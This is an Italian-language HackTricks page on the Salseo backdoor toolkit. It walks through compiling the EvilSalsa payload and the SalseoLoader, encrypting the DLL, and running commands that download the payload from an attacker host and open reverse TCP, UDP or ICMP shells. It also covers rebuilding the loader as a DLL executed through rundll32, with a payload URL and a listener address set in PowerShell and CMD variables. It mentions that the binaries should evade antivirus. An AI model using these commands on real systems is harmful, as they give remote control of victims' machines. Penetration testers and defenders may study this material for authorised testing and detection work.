# Salseo

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Compilare i binari

Scarica il codice sorgente da github e compila **EvilSalsa** e **SalseoLoader**. Avrai bisogno di **Visual Studio** installato per compilare il codice.

Compila quei progetti per l'architettura della macchina Windows dove li utilizzerai (Se Windows supporta x64, compilali per quell'architettura).

Puoi **selezionare l'architettura** all'interno di Visual Studio nella scheda **"Build"** a sinistra in **"Platform Target".**

(\*\*Se non riesci a trovare queste opzioni premi su **"Project Tab"** e poi su **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Quindi, compila entrambi i progetti (Build -> Build Solution) (All'interno dei log apparirà il percorso dell'eseguibile):

![](<../.gitbook/assets/image (381).png>)

## Preparare il Backdoor

Prima di tutto, dovrai codificare il **EvilSalsa.dll.** Per farlo, puoi utilizzare lo script python **encrypterassembly.py** o puoi compilare il progetto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ora hai tutto il necessario per eseguire tutto il Salseo: l'**EvilDalsa.dll codificato** e il **binario di SalseoLoader.**

**Carica il binario SalseoLoader.exe sulla macchina. Non dovrebbero essere rilevati da alcun AV...**

## **Esegui il backdoor**

### **Ottenere una shell TCP inversa (scaricando la dll codificata tramite HTTP)**

Ricorda di avviare un nc come listener della shell inversa e un server HTTP per servire l'evilsalsa codificato.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Ottenere una shell inversa UDP (scaricando dll codificato tramite SMB)**

Ricorda di avviare un nc come listener della shell inversa e un server SMB per servire il male codificato (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Ottenere una shell inversa ICMP (dll già codificata all'interno della vittima)**

**Questa volta è necessario uno strumento speciale nel client per ricevere la shell inversa. Scarica:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Disabilita le risposte ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Esegui il client:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### All'interno della vittima, eseguiamo la cosa del salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilazione di SalseoLoader come DLL esportando la funzione principale

Apri il progetto SalseoLoader usando Visual Studio.

### Aggiungi prima della funzione principale: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Installa DllExport per questo progetto

#### **Strumenti** --> **Gestione pacchetti NuGet** --> **Gestisci pacchetti NuGet per la soluzione...**

![](<../.gitbook/assets/image (881).png>)

#### **Cerca il pacchetto DllExport (usando la scheda Sfoglia), e premi Installa (e accetta il popup)**

![](<../.gitbook/assets/image (100).png>)

Nella cartella del tuo progetto sono comparsi i file: **DllExport.bat** e **DllExport\_Configure.bat**

### **Disinstalla DllExport**

Premi **Disinstalla** (sì, è strano ma fidati, è necessario)

![](<../.gitbook/assets/image (97).png>)

### **Esci da Visual Studio ed esegui DllExport\_configure**

Semplicemente **esci** da Visual Studio

Successivamente, vai nella tua cartella **SalseoLoader** ed **esegui DllExport\_Configure.bat**

Seleziona **x64** (se lo utilizzerai all'interno di una casella x64, come nel mio caso), seleziona **System.Runtime.InteropServices** (all'interno di **Namespace per DllExport**) e premi **Applica**

![](<../.gitbook/assets/image (882).png>)

### **Apri nuovamente il progetto con Visual Studio**

**\[DllExport]** non dovrebbe più essere segnato come errore

![](<../.gitbook/assets/image (670).png>)

### Compila la soluzione

Seleziona **Tipo di output = Libreria di classi** (Progetto --> Proprietà SalseoLoader --> Applicazione --> Tipo di output = Libreria di classi)

![](<../.gitbook/assets/image (847).png>)

Seleziona **piattaforma x64** (Progetto --> Proprietà SalseoLoader --> Compila --> Destinazione della piattaforma = x64)

![](<../.gitbook/assets/image (285).png>)

Per **compilare** la soluzione: Compila --> Compila soluzione (Nella console di output apparirà il percorso del nuovo file DLL)

### Testa il Dll generato

Copia e incolla il Dll dove desideri testarlo.

Esegui:
```
rundll32.exe SalseoLoader.dll,main
```
Se non appare alcun errore, probabilmente hai una DLL funzionale!!

## Ottenere una shell utilizzando la DLL

Non dimenticare di utilizzare un **server** **HTTP** e impostare un **listener nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

Il prompt dei comandi (Command Prompt) è un'interfaccia testuale interattiva per comunicare con il sistema operativo.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
